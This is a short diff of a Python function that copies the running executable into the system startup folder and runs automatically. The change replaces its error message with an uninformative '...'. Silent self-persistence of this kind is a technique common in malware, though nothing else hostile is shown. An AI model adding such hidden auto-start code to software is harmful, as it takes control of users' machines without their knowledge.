@@ -56,7 +56,7 @@ def add_to_startup():
             shutil.copy(sys.executable, exe_path)  # Copies the EXE to the startup folder
             print(f"...")
         except Exception as e:
-            print(f"Error adding to startup: {e}")
+            print(f"...")
 
 
 add_to_startup()
